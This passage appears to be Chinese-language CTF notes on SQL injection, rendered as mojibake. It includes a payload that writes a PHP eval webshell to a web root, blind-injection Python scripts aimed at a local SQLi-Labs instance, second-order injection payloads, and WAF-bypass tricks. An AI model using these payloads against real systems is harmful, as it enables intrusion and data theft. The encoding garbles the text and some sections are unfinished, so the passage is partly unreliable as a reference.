>   MariaDB [(none)]> select abs(0x7FFFFFFFFFFFFFFF + 1);
>   +-----------------------------+
>   | abs(0x7FFFFFFFFFFFFFFF + 1) |
>   +-----------------------------+
>   |         9223372036854775808 |
>   +-----------------------------+
>   
>   MariaDB [(none)]> select abs(0x8000000000000000);
>   +-------------------------+
>   | abs(0x8000000000000000) |
>   +-------------------------+
>   |    -9223372036854775808 |
>   +-------------------------+
>   ```
>
> - MySQLï¼šè¶…è¿‡`0x8000000000000000`æ—¶ï¼Œè¿”å›å€¼å®Œå…¨ä¸å¯é¢„æµ‹ã€‚åœ¨ä¸€æ®µåŒºé—´å†…ç¨³å®šä¸åŠ¨ï¼Œåœ¨å¦ä¸€åŒºé—´å†…è¿”å›æ— è§„å¾‹å¤§æ•°ã€‚
>
>   ```mysql
>   mysql> select abs(0x7fffffffffffffff);
>   +-------------------------+
>   | abs(0x7fffffffffffffff) |
>   +-------------------------+
>   |     9223372036854776000 |
>   +-------------------------+
>                     
>   mysql> select abs(0x8000000000000000);
>   +-------------------------+
>   | abs(0x8000000000000000) |
>   +-------------------------+
>   |     9223372036854776000 |
>   +-------------------------+
>                     
>   mysql> select abs(0x7fffffffffffffff + 1);
>   +-----------------------------+
>   | abs(0x7fffffffffffffff + 1) |
>   +-----------------------------+
>   |         9223372036854776000 |
>   +-----------------------------+
>                     
>   mysql> select abs(0xFFFFFFFFFFFFFFFF);
>   +-------------------------+
>   | abs(0xFFFFFFFFFFFFFFFF) |
>   +-------------------------+
>   |    18446744073709552000 |
>   +-------------------------+
>   ```

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ[HarekazeCTF2019]Sqlite Voting TODOï¼šï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting

## Â§3.2 æ–‡ä»¶æ³¨å…¥

> æ³¨æ„ï¼šè¯¥æ³¨å…¥éœ€è¦ç¡®ä¿`secure_file_priv`çš„å€¼é`NULL`ï¼Œè¯¦è§[Â§1.2.7 MySQLçš„`secure_file_priv`å‚æ•°](#Â§1.2.7 MySQLçš„`secure_file_priv`å‚æ•°)ä¸€èŠ‚ã€‚

æ„é€ PHP WebShellï¼š

```sql
?id=1')) union select null,0x3c3f70687020406576616c28245f504f53545b277368656c6c275d293b203f3e,null into outfile '/var/www/html/shell.php' --+
```

## Â§3.3 ç›²æ³¨ï¼ˆBind Injectï¼‰

### Â§3.3.1 å¸ƒå°”ç›²æ³¨ï¼ˆBoolean Basedï¼‰

å¦‚æœæˆåŠŸä¸å¤±è´¥å‡æ— å›æ˜¾ï¼Œä½†æ˜¯æŸ¥è¯¢æˆåŠŸ/å¤±è´¥çš„ç‰¹å¾å·®åˆ«éå¸¸æ˜¾è‘—ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨äºè·å–æ•°æ®åº“åçš„è„šæœ¬ï¼Œä½¿ç”¨ç©·ä¸¾æ³•ã€‚ä»¤æ•°æ®åº“åé•¿åº¦ä¸º$m$ï¼ŒASCIIç å–å€¼èŒƒå›´ä¸º$n$ï¼Œåˆ™æ—¶é—´å¤æ‚åº¦ä¸º$O(mn^2)$ï¼š

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

databaseLength = 0
URL = URL_PREFIX + "?id=1' and length(database())={} --+"
for filedLength in range(1,MAX_FILED_LENGTH+1):
    result = requests.get(URL.format(filedLength))
    if "You are in..........." in result.text:
        databaseLength = filedLength
        print("æ•°æ®åº“åé•¿åº¦å…±{}ä½".format(filedLength))
        break

databaseName = ""
URL = URL_PREFIX + "?id=1' and ascii(substr((select database()),{},1)) = {}--+"
for filedLength in range(1, databaseLength+1):  # substr()æ˜¯ä»1å¼€å§‹æ•°çš„ï¼Œè€Œä¸æ˜¯0
    for characterAscii in range(0, 128):
        result = requests.get(URL.format(filedLength, characterAscii))
        if "You are in..........." in result.text:
            databaseName += chr(characterAscii)
            print(databaseName)
            break
```

ä¸ºäº†åŠ å¿«æœç´¢é€Ÿåº¦ï¼Œæˆ‘ä»¬å¸¸ç”¨äºŒåˆ†æŸ¥æ‰¾ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º$O(m\log_2{n})$ï¼š

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

databaseLengthRange = [1,MAX_FILED_LENGTH]
URL = URL_PREFIX + "?id=1' and length(database())>{} --+"
while databaseLengthRange[0] != databaseLengthRange[1]:
    currentDatabaseLength = sum(databaseLengthRange) // 2
    if "You are in..........." in requests.get(URL.format(currentDatabaseLength)).text:
        databaseLengthRange[0] = currentDatabaseLength + 1
        continue
    else:
        databaseLengthRange[1] = currentDatabaseLength
        continue
databaseLength = databaseLengthRange[0]
print("æ•°æ®åº“åçš„é•¿åº¦ä¸º{}ä½".format(databaseLength))

databaseName = ""
URL = URL_PREFIX + "?id=1' and ascii(substr((select database()),{},1)) > {}--+"
for filedLength in range(1, databaseLength+1):  # substr()æ˜¯ä»1å¼€å§‹æ•°çš„ï¼Œè€Œä¸æ˜¯0
    characterAsciiRange = [0,127]
    while characterAsciiRange[0] != characterAsciiRange[1]:
        currentCharacterAscii = sum(characterAsciiRange) // 2
        if "You are in..........." in requests.get(URL.format(filedLength, currentCharacterAscii)).text:
            characterAsciiRange[0] = currentCharacterAscii + 1
            continue
        else:
            characterAsciiRange[1] = currentCharacterAscii
            continue
    databaseName += chr(characterAsciiRange[0])
    print(databaseName)
```

æˆ‘ä»¬è¿˜å¯ä»¥å¯¹ä¸Šè¿°é€»è¾‘å°è£…æˆä¸€ä¸ªé€šç”¨çš„å‡½æ•°ï¼š

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"


def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
    """
        url : å½¢å¦‚...>{}çš„é“¾æ¥
        paramRange : [å‚æ•°çš„æœ€å°å€¼,å‚æ•°çš„æœ€å¤§å€¼]
        successInfo : æˆåŠŸæ—¶çš„å›æ˜¾å†…å®¹
    """
    while paramRange[0] != paramRange[1]:
        tempParam = sum(paramRange) // 2
        result = requests.get(url.format(tempParam)).text
        if successInfo in result:
            paramRange[0] = tempParam + 1
            continue
        else:
            paramRange[1] = tempParam
            continue
    return paramRange[0]


databaseNameLength = getBinarySearchResult(
    URL_PREFIX + "?id=1' and length(database())>{} --+",
    [1, MAX_FILED_LENGTH],
    "You are in..........."
)
print("æ•°æ®åº“åçš„é•¿åº¦ä¸º{}ä½".format(databaseNameLength))

databaseName = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((ä»»æ„åªæœ‰ä¸€è¡Œçš„SELECTå­å¥)," + str(i) + ",1)) > {} --+",
        [0, 128],
        "You are in..........."
    ))
    print(databaseName)
```

### Â§3.3.2 æ—¶é—´ç›²æ³¨ï¼ˆTime Basedï¼‰

å¦‚æœæˆåŠŸä¸å¤±è´¥å‡æ— å›æ˜¾ï¼Œå¹¶ä¸”æŸ¥è¯¢æˆåŠŸ/å¤±è´¥çš„ç‰¹å¾æ²¡æœ‰ä»»ä½•å·®åˆ«ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5 # æ ¹æ®å®é™…ç½‘ç»œç¯å¢ƒé€‚å½“è°ƒå¤§


def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
    """
        url : å½¢å¦‚...>{}çš„é“¾æ¥
        paramRange : [å‚æ•°çš„æœ€å°å€¼,å‚æ•°çš„æœ€å¤§å€¼]
        sleepTime : æˆåŠŸæ—¶çš„ç¡çœ æ—¶é—´
    """
    while paramRange[0] != paramRange[1]:
        tempParam = sum(paramRange) // 2
        startTime = time.perf_counter()
        result = requests.get(url.format(tempParam)).text
        endTime = time.perf_counter()
        if(endTime-startTime>sleepTime):
            paramRange[0] = tempParam + 1
        else:
            paramRange[1] = tempParam
    return paramRange[0]

data = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((SELECTè¯­å¥)," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(data)
```

## Â§3.4 å †å æ³¨å…¥

## Â§3.5 é¢„å¤„ç†æ³¨å…¥

æˆ‘ä»¬çŸ¥é“ï¼ŒSQLè¯­å¥åˆ†ä¸ºä¸¤ç±»â€”â€”å³æ—¶SQLä¸é¢„å¤„ç†ï¼ˆPrepared Statementï¼‰SQLã€‚é¢„å¤„ç†SQLå¯ä»¥å°†è¯­å¥ä¸­çš„å‚æ•°æ¢æˆå ä½ç¬¦ï¼Œä½¿å…¶æ¨¡æ¿åŒ–ï¼Œè¿™æ ·å°±ä¸å¿…æ¯æ¬¡éƒ½æ‰§è¡Œä¸€éè¯­æ³•è§£æï¼Œå¯ä»¥æé«˜æ‰§è¡Œæ•ˆç‡ï¼š

```mysql
mysql> PREPARE statement FROM 'SELECT * FROM users WHERE id=?';
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> set @id = 1;
Query OK, 0 rows affected (0.00 sec)

mysql> EXECUTE statement USING @id;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 123      |
+----+----------+----------+
1 row in set (0.00 sec)
```

SQLä¸­è¦è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ—¢å¯ä»¥ä½¿ç”¨å¼•å·åŒ…è£¹å…¶å†…å®¹ï¼Œä¹Ÿå¯ä»¥å°†å…¶åå…­è¿›åˆ¶å½¢å¼èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œè¯¥å˜é‡ä¼šå°†åå…­è¿›åˆ¶æ•°éšå¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š

```mysql
mysql> set @a = 0x53454c454354202a2046524f4d2075736572732057484552452069643d3f;
Query OK, 0 rows affected (0.00 sec)

mysql> select @a;
+--------------------------------+
| @a                             |
+--------------------------------+
| SELECT * FROM users WHERE id=? |
+--------------------------------+
1 row in set (0.00 sec)
```

äºæ˜¯æˆ‘ä»¬å¯ä»¥å€ŸåŠ©åå…­è¿›åˆ¶å­—ç¬¦ä¸²ç»•è¿‡WAFï¼š

```mysql
mysql> set @a = 0x53454c454354202a2046524f4d2075736572732057484552452069643d3f;
Query OK, 0 rows affected (0.00 sec)

mysql> PREPARE statement FROM 0x53454c454354202a2046524f4d2075736572732057484552452069643d3f; # ä¸èƒ½ç»•è¿‡èµ‹å€¼è¿™ä¸€æ­¥ï¼
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0x53454c454354202a2046524f4d2075736572732057484552452069643d3f' at line 1

mysql> PREPARE statement FROM @a;
Query OK, 0 rows affected (0.00 sec)
Statement prepared
```

## Â§3.6 æ­£åˆ™æ³¨å…¥

## Â§3.7 äºŒæ¬¡æ³¨å…¥

è®¾æƒ³ä»¥ä¸‹ç”¨æˆ·ç³»ç»Ÿï¼š

```php
$username = addslashes($_POST['username']); # ç”¨æˆ·å
$password = md5($_POST['password']); # å¯†ç 
$info = addslashes($_POST['info']); # ä¸ªäººç®€ä»‹

# æ·»åŠ ç”¨æˆ·
$sql = "insert into users(username,password,info) values ('{$username}','{$password}','æœªå®šä¹‰ä¸ªäººç®€ä»‹');"

# ç™»å½•ç”¨æˆ·
$sql = "select * from users where username='{$username}' and password='{$password}';"
if($res = mysql_fetch_assoc(mysql_query($sql))){
	$_SESSION['username'] = $res['username'];
}

# æŸ¥çœ‹ä¸ªäººç®€ä»‹
$sql = "select info from us ers where username='{$_SESSION['username']}';";
echo mysql_fetch_assoc(mysql_query($sql))['info'];

# ä¿®æ”¹ä¸ªäººç®€ä»‹
$sql = "update users set info='{$info}' where username='{$_SESSION['username']}';";
```

åˆ†æä»¥ä¸‹Payloadï¼š

```php
$_POST['username'] = "1' union select database() #"
$_POST['password'] = ......;
$_POST['info'] = ......;
```

ç¬¬ä¸€ä¸ªSQLè¯­å¥è´Ÿè´£åˆ›å»ºç”¨æˆ·ã€‚ç”±äº`$username`ä¼šç”¨åˆ°`addslashes()`è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥æ‹¼æ¥å¾—åˆ°çš„SQLè¯­å¥ä¸­ä¼šåŒ…å«å¤§é‡çš„`\`ã€‚æ•°æ®åº“æ‰§è¡Œæ—¶ï¼Œåˆä¼šå°†`\`è§†ä¸ºè½¬ä¹‰æ ‡è¯†ç¬¦ï¼Œè€Œé`\`å­—ç¬¦æœ¬èº«ï¼Œæ‰€ä»¥æ•°æ®åº“ä¸­å­˜å‚¨çš„æ˜¯åŸå°ä¸åŠ¨çš„`1' union select database() #`ã€‚

ç¬¬äºŒä¸ªSQLè¯­å¥è´Ÿè´£ç™»å½•ç”¨æˆ·ã€‚ç”±äºæ•°æ®åº“ä¸­çš„`username`å­—æ®µæœªç»è½¬ä¹‰ï¼Œæ‰€ä»¥`$_SEESION['username']`ä¸­å­˜å‚¨çš„ä¹Ÿæ˜¯æœªç»è½¬ä¹‰çš„ç”¨æˆ·åã€‚

ç¬¬ä¸‰ä¸ªSQLè¯­å¥è´Ÿè´£æŸ¥è¯¢ä¸ªäººç®€ä»‹ã€‚æ³¨æ„åˆ°`$_SEESION['username']`æœªç»è½¬ä¹‰ï¼Œå› æ­¤æ­¤å¤„å‚æ•°å¯æ§ï¼Œå¯ä»¥æ³¨å…¥ï¼Œæ‹¼æ¥çš„SQLè¯­å¥ç­‰ä»·äº`select info from users where username = '1' union select database() #`ã€‚æˆ‘ä»¬å¹¶æ²¡æœ‰æ³¨å†Œè¿‡ç”¨æˆ·åä¸º`1`çš„è´¦æˆ·ï¼Œå› æ­¤å‰ä¸€ä¸ª`SELECT`è¯­å¥è¿”å›ç©ºå€¼ï¼Œè€Œåä¸€ä¸ª`SELECT`è¯­å¥çš„å€¼è¢«åˆå¹¶åˆ°`info`ä¸€åˆ—ä¸­ï¼Œé€ æˆå›æ˜¾ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°æ³¨å†Œç”¨æˆ·åï¼Œå¹¶æŸ¥çœ‹å…¶ä¸ªäººç®€ä»‹ä¸€æ ï¼Œä»è€Œè¿›è¡Œçˆ†åº“ï¼š

```python
import requests

URL_PREFIX = "......"

def send(action: str, postData: dict):
    # æŒ‰ç…§actionå‘é€åˆ°ä¸åŒçš„URL

def register(username:str,password:str)->None:
    postData = {"username":username,"password":password}
    send('reg',postData)

def login(username:str,password:str)->str:
    postData = {"username":username,"password":password}
    return send('login',postData)

def getResult(username:str,password:str)->str:
    register(username,password)
    return login(username,password)
    
usernamePayloads = [
    "1' union select database() #",
    "1' union select group_concat(table_name) from information_schema.tables where table_schema=database() #",
    "1' union select group_concat(column_name) from information_schema.columns where table_name='flag' #",
    "1' union select group_concat(flag) from ctftraining.flag #"
] # çˆ†æ•°æ®åº“åã€çˆ†è¡¨åã€çˆ†åˆ—åã€çˆ†æ•°æ®
for username in usernamePayloads:
    print(getResult(username,"123456"))
```

## Â§3.8 `handler`æ³¨å…¥

`HANDLER`æ˜¯SQLä¸­çš„ä¸€ä¸ªå…³é”®è¯ï¼Œä½†æ˜¯å®ƒå¹¶ä¸å±äºæ ‡å‡†çš„SQLè¯­æ³•ã€‚æ ¹æ®[å®˜æ–¹æ–‡æ¡£](https://dev.mysql.com/doc/refman/5.6/en/handler.html)ï¼Œ`HANDLER`å­å¥æä¾›åœ¨å­˜å‚¨å¼•æ“å±‚é¢ï¼ˆInnoDBã€MyISAMï¼‰ç›´è®¿è¡¨ä¸­å†…å®¹çš„æ¥å£ã€‚

> [MySQL 5.6 Reference Manual](https://dev.mysql.com/doc/refman/5.6/en/) / [...](https://dev.mysql.com/doc/refman/5.6/en/handler.html) / HANDLER Statement
>
> 13.2.4 HANDLER Statement
>
> ```
> HANDLER tbl_name OPEN [ [AS] alias]
> 
> HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
>     [ WHERE where_condition ] [LIMIT ... ]
> HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
>     [ WHERE where_condition ] [LIMIT ... ]
> HANDLER tbl_name READ { FIRST | NEXT }
>     [ WHERE where_condition ] [LIMIT ... ]
> 
> HANDLER tbl_name CLOSE
> ```

```mysql
mysql> HANDLER è¡¨å OPEN as a;
Query OK, 0 rows affected (0.00 sec)

mysql> HANDLER a READ NEXT;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 123      |
+----+----------+----------+

mysql> HANDLER a READ NEXT;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  2 | Angelina | 123      |
+----+----------+----------+

mysql> HANDLER a READ NEXT;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | Dummy    | 123      |
+----+----------+----------+

mysql> HANDLER a CLOSE;
Query OK, 0 rows affected (0.00 sec)
```



# Â§4 ç»•è¿‡WAF

## Â§4.1 Fuzz



## Â§4.2 æ¯”è¾ƒæ•°å­—å¤§å°

ä¼—æ‰€å‘¨çŸ¥ï¼ŒSQLæä¾›`=`ã€`<`ã€`>`ã€`<=`ã€`>=`ã€`<>`ç”¨äºæ¯”è¾ƒæ•°å­—çš„å¤§å°ã€‚å‡å¦‚WAFè¿‡æ»¤äº†`<`ã€`>`ã€`=`è¿™ä¸‰ç§å­—ç¬¦ï¼Œæˆ‘ä»¬æ€ä¹ˆæ¯”è¾ƒå‘¢ï¼Ÿ

### Â§4.2.1 `ifnull()`ä¸`nullif()`

| å‡½æ•°å        | è¿”å›å€¼                                  |
| ------------- | --------------------------------------- |
| `ifnull(a,b)` | return a != NULL ? a : bï¼ˆNullå°±è¿”å›bï¼‰ |
| `nullif(a,b)` | return a=b ? NULL : aï¼ˆçŒœå¯¹å°±è¿”å›Nullï¼‰ |

æˆ‘ä»¬ä½¿ç”¨`nullif(å¾…æµ‹å€¼,çŒœæµ‹å€¼)`ï¼Œé€šè¿‡ç©·ä¸¾`çŒœæµ‹å€¼`å¯ä»¥å¾—åˆ°`çŒœæµ‹ç»“æœ`ã€‚å†ä½¿ç”¨`ifnull(çŒœæµ‹ç»“æœ,å¤±è´¥å€¼)`ï¼Œå¯ä»¥å¾—åˆ°`æˆåŠŸå€¼`ã€‚å°†è¿™ä¸¤ä¸ªå‡½æ•°å¥—èµ·æ¥ä½¿ç”¨ï¼Œæˆ‘ä»¬æœ€ç»ˆå¾—åˆ°çš„è¿”å›å€¼ç­‰ä»·äº`å¾…æµ‹å€¼==çŒœæµ‹å€¼ ? æˆåŠŸå€¼ : å¾…æµ‹å€¼`ã€‚æ­¤å¤„çš„`æˆåŠŸå€¼`ç”±æ”»å‡»è€…å®Œå…¨å¯æ§ï¼š

```sql
mysql> select ifnull(nullif(length((SELECTå­å¥)),çŒœæµ‹å€¼),å¤±è´¥å€¼); # çŒœæµ‹å­—ç¬¦ä¸²é•¿åº¦

mysql> select ifnull(nullif(length((select(database()))),7),-1);
	# 8,çŒœæµ‹å¤±è´¥,è¿”å›å­—ç¬¦ä¸²é•¿åº¦
mysql> select ifnull(nullif(length((select(database()))),8),-1);
	# -1,çŒœæµ‹æˆåŠŸ,è¿”å›æˆåŠŸå€¼
mysql> select ifnull(nullif(length((select(database()))),9),-1);
	# 8,çŒœæµ‹å¤±è´¥ï¼Œè¿”å›å­—ç¬¦ä¸²é•¿åº¦
```

ç”±äºæˆåŠŸå€¼å®Œå…¨å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å…¶ç­‰äºä¸€äº›å¼‚å¸¸å€¼ï¼Œä½¿SQLè¯­å¥æŠ¥é”™ï¼Œè¯¦è§æŠ¥é”™æ³¨å…¥ã€‚

### Â§4.2.2 `case()when()then()else()`

SQLä¸­æœ‰ä¸€ç±»`case`è¯­å¥ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºå…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­çš„`switch()`ã€‚æŒ‰ç†æ¥è¯´ï¼Œ`case()`æä¾›çš„åŠŸèƒ½ä¹Ÿå¯ä»¥è§†ä¸ºä¸€ç§æ¯”è¾ƒï¼š

```sql
mysql> select case(å¾…æµ‹å€¼)when(çŒœæµ‹å€¼1)then(æˆåŠŸå€¼1)when(çŒœæµ‹å€¼2)then(æˆåŠŸå€¼2)else(å¤±è´¥å€¼)end;

mysql> select username,case username
    when 'å˜‰ç„¶Diana' then 'Asoul'
    when 'ä¸ƒæµ·Nana7mi' then 'Virtual Real'
    when 'ç™½ç¥é¥Haruka' then 'PSP Live'
    else 'å…¶å®ƒ'
    end as 'æ‰€å±ç¤¾å›¢'
from users;
```

### Â§4.2.3 `regexp()`

`regexp()`èƒ½ä»ä¸€ä¸ªå­—æ®µçš„å¤šä¸ªæ•°æ®ä¸­æè¿‡æ»¤å¾—åˆ°ç¬¦åˆç»™å®šæ­£åˆ™è¡¨è¾¾å¼çš„æ•°æ®ï¼Œç‰¹åˆ«é€‚ç”¨äºèŠ‚çœ`group_concat()`è¿”å›çš„å­—ç¬¦æ•°ã€‚

```sql
mysql> 
```



## Â§4.3 ä»å­—ç¬¦ä¸²ä¸­æå–å­—ç¬¦

æˆ‘ä»¬çŸ¥é“ï¼Œ`substr()`ä¸`substring()`ï¼ˆ`substr(å­—ç¬¦ä¸²ï¼Œä»1å¼€å§‹çš„èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)`ï¼‰ç»å¸¸è¢«ç”¨äºä»å­—ç¬¦ä¸²ä¸­æå–å­—ç¬¦ã€‚å‡å¦‚WAFæ‹¦æˆªäº†è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ

### Â§4.3.1 `instr()`

`instr(å­—ç¬¦ä¸²,å­å­—ç¬¦ä¸²)`ç”¨äºè¿”å›å­å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°æ—¶ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®ï¼ˆä»ä¸€å¼€å§‹æ•°ï¼‰ã€‚

> æ³¨æ„ï¼šæ­¤å‡½æ•°ä¸åŒºåˆ†å­—ç¬¦çš„å¤§å°å†™ã€‚

```sql
mysql> select(instr((select(database())),'e'));
+-----------------------------------+
| (instr((select(database())),'e')) |
+-----------------------------------+
|                                 2 |
+-----------------------------------+
```

```c
function getData(){
	SELECTå­å¥ = input(è¾“å…¥SELECTå­å¥);
	å­å­—ç¬¦ä¸² = '';
    while(1){
    	for(int ascii = 0 ; ascii < 128 ; ascii++){
            if((å­å­—ç¬¦ä¸²+ascii)å¾—åˆ°çš„ç»“æœ = 1){
                å­å­—ç¬¦ä¸² += ascii
                break;
            }
        }
    }
}
```

### Â§4.3.2 `left()`ä¸`right()`

| å‡½æ•°å                   | è¿”å›å€¼                                     |
| ------------------------ | ------------------------------------------ |
| `left(å­—ç¬¦ä¸²,æˆªå–é•¿åº¦)`  | ä»å­—ç¬¦ä¸²æœ€å·¦ç«¯å¼€å§‹ï¼Œæˆªå–å›ºå®šé•¿åº¦çš„å­å­—ç¬¦ä¸² |
| `right(å­—ç¬¦ä¸²,æˆªå–é•¿åº¦)` | ä»å­—ç¬¦ä¸²æœ€å³ç«¯å¼€å§‹ï¼Œæˆªå–å›ºå®šé•¿åº¦çš„å­å­—ç¬¦ä¸² |

## Â§4.4 åˆ›å»ºå¤§æ•°

å¤§æ•°æº¢å‡ºæ³¨å…¥è¦æ±‚æ•°å­—å¿…é¡»å¤§äºç­‰äº`0x8000000000000000`ã€‚å‡å¦‚WAFé™åˆ¶ä¸è®¸æœ‰ä¸‰ä¸ªåŠä»¥ä¸Šçš„è¿ç»­æ•°å­—ï¼Œè¯¥æ€ä¹ˆæ„é€ å‡ºå¤§æ•°å‘¢ï¼Ÿ

### Â§4.4.1 `~0+1`

```mysql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

### Â§4.4.2 `exp(710)`

```mysql
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```

å¦‚æœé¢˜ç›®å¯¹æ•°å­—çš„èŒƒå›´é™åˆ¶æ›´ä¸¥æ ¼ï¼Œå…è®¸çš„æ•°å­—æ›´å°ï¼Œåˆ™å¯ä»¥è€ƒè™‘æŠŠ`710`æ‰©å†™æˆ`9+9+9+...+9`ã€‚

## Â§4.5 ç»•è¿‡ç©ºæ ¼

### Â§4.5.1 å†…è”æ³¨é‡Š`/**/`

æœ‰ä¸€äº›WAFæ˜¯åŸºäºæ­£åˆ™è¡¨è¾¾å¼å®ç°è¿‡æ»¤çš„ã€‚å„å¤§SQLæ•°æ®åº“å‡æ”¯æŒä½¿ç”¨`/**/`å°†å…¶ä¸­çš„å†…å®¹è§†ä¸ºæ³¨é‡Šã€‚ä½¿ç”¨å†…è”æ³¨é‡Šå¯ä»¥ç»•è¿‡WAFã€‚

```python
def WAF(rawString:str)->bool:
    if re.search(r'\s',rawString) is None:
        print('"{}" succeed.'.format(rawString))
    else:
        print('"{}" failed'.format(rawString))

def bypassWAF(rawString:str)->str:
    return rawString.replace(' ','/**/')

payload = "select * from users;"
WAF(payload)
WAF(bypassWAF(payload))
```

```mysql
mysql> select/**/*/**/from/**/users;
	// ......
	13 rows in set (0.01 sec)
```

MySQLä¸ºäº†ä¿è¯ä¸å…¶å®ƒæ•°æ®åº“å…¼å®¹ï¼Œäºæ˜¯å°†MySQLç‰¹æœ‰çš„è¯­æ³•æ”¾åœ¨`/*!...*/`ä¸­ã€‚å…¶å®ƒSQLæ•°æ®åº“ä¼šå°†å…¶è§†ä¸ºæ³¨é‡Šï¼Œä½†æ˜¯MySQLå¯ä»¥æ‰§è¡Œã€‚ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªäº”ä½æ•°æ¥æŒ‡å®šè¯¥è¯­å¥æ‰§è¡Œæ‰€éœ€çš„MySQLæœ€ä½ç‰ˆæœ¬ï¼Œä¾‹å¦‚`/*!50001... */`è¡¨ç¤ºMySQLç‰ˆæœ¬`>=5.00.01`æ—¶æ‰èƒ½æ‰§è¡Œã€‚

### Â§4.5.2 `%0a`/`%0b`/`%0c`

| ASCIIç  | å«ä¹‰ |
| ------- | ---- |
|         |      |
|         |      |
|         |      |

`%0a`æ˜¯æ¢è¡Œçš„æ„æ€ã€‚è¿™ä¸ªå­—ç¬¦çš„ç¥å¥‡ä¹‹å¤„åœ¨äºå®ƒèƒ½ç»•è¿‡æ³¨é‡Šçš„é™åˆ¶ã€‚ä¾‹å¦‚`-- abc /* %0a */`ï¼Œå…¶ä¸­`--`åçš„å­—ç¬¦è¢«è§£æä¸ºæ³¨é‡Šï¼Œç›´åˆ°é‡åˆ°äº†`%0a`å¦èµ·ä¸€è¡Œã€‚æˆ‘ä»¬çŸ¥é“`--`æ˜¯å•è¡Œæ³¨é‡Šï¼Œå› æ­¤ä¸ä¼šå¹²æ‰°ä¸‹ä¸€è¡Œï¼Œäºæ˜¯è¿™ä¸ªå¥å­å®Œå…¨ç­‰ä»·äº`*/`ã€‚

å°†`%0a`ä¸[Â§4.5.1 å†…è”æ³¨é‡Š`/**/`](###Â§4.5.1 å†…è”æ³¨é‡Š`/**/`)ä¸€èŠ‚ä»‹ç»çš„å†…å®¹ç»“åˆï¼Œæˆ‘ä»¬å°±èƒ½å¯¹MySQLå®ç°å®Œç¾çš„WAFç»•è¿‡ï¼š

```sql
> id=1'/**/union/*!50001select*//*!1,2,3*/--abc/*%0afrom/**/admin#*/
â†’ id=1' union select 1,2,3 -- abc/*
	from admin #*/
```







å¯¹äºè¿™ä¸ªæ³¨å…¥ç‚¹ï¼š`SELECT * FROM users WHERE id='' LIMIT 0,1`ï¼Œå¹¶ä¸”è¿‡æ»¤äº†ç©ºæ ¼ä¸`and`ã€`or`ï¼Œå¯ä»¥ä½¿ç”¨`^`è¿ç®—ç¬¦ã€‚å…¶ä¼˜ç‚¹åœ¨äºè¿™ä¸ªäºŒå…ƒè¿ç®—ç¬¦ä¸¤ä¾§çš„è¡¨è¾¾å¼ä¹‹é—´ä¸å¿…æœ‰ç©ºæ ¼ï¼Œå¯ä»¥é”™è¯¯æ³¨å…¥ã€‚

`select username from ... where ...`åŒ…å«ç©ºæ ¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç”¨`select(username)from(...)where(...)`

ä¸èƒ½ç”¨`where(id=1)`çš„`=`ï¼Œæˆ‘ä»¬å°±ç”¨`where((åˆ—å)like('æ•°æ®'))`

